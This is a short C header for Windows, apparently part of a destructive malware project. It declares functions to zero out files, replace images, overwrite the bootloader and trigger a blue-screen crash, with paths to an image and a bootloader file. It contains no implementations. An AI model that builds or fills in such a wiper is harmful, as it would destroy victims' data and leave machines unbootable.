#ifndef PAYLOADS_H
#define PAYLOADS_H

#include <windows.h>
#include <stddef.h>

#define BUFFER_SIZE 4096
#define IMAGE_PATH "assets/image.jpg"
#define BOOTLOADER_PATH "bootloader.bin"

BOOL ZeroOutFile(LPCWSTR filename);
BOOL ReplaceImage(LPCWSTR filename);
BOOL OverwriteBootloader();
void TriggerBSOD();

#endif